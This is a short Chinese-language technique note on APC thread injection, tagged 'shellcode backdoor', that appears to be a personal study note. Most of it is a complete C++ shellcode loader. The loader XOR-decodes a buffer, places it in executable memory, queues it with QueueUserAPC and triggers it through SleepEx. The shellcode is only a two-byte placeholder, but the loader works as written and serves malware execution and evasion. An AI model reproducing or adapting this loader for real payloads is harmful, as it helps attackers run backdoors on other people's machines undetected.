# APC线程注入

keywords: shellcode backdoor  

APC, Asynchronous Procedure Calls, 异步过程调用，在特定线程的上下文中异步执行函数  
这些函数可以触发异步执行函数调用：  
```r
SleepEx
SignalObjectAndWait
MsgWaitForMultipleObjectsEx
WaitForMultipleObjectsEx
WaitForSingleObjectEx 
```

示例：  
```cpp
#include <stdio.h>
#include <windows.h>
#include <string.h>

int main()
{
    char xor_shell[] = "\x11\x22";

    char* shellcode;
    int shellcode_size = 0;

    for (int i = 0; i < sizeof xor_shell; i++)
    {
        xor_shell[i] ^= 13;
    }

    shellcode = xor_shell;
    shellcode_size = sizeof(xor_shell);

    // 开启一个线程
    HANDLE hthread = OpenThread(16, 0, GetCurrentThreadId());

    // 给现在的进程申请一个可读可执行的内存
    char* buffer = (char*)VirtualAllocEx(GetCurrentProcess(), 0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 复制内存内容
    CopyMemory(buffer, shellcode, shellcode_size);

    // 将用户模式异步过程调用(APC)对象添加到指定线程的APC队列
    // 这里就是添加到此线程的APC队列
    // 第一个参数是 指向应用程序提供的APC函数的指针，该函数在指定线程执行可警报等待操作时调用
    QueueUserAPC((PAPCFUNC)buffer, hthread, (ULONG_PTR)buffer);

    // 挂起当前线程，直到满足指定条件，超过时间间隔后，执行恢复
    SleepEx(5, 1);

    return 0;
}
```

来源: 初九_9 https://www.bilibili.com/video/BV1Km4y1Z73g  
APC介绍: https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls  


2022/2/15  
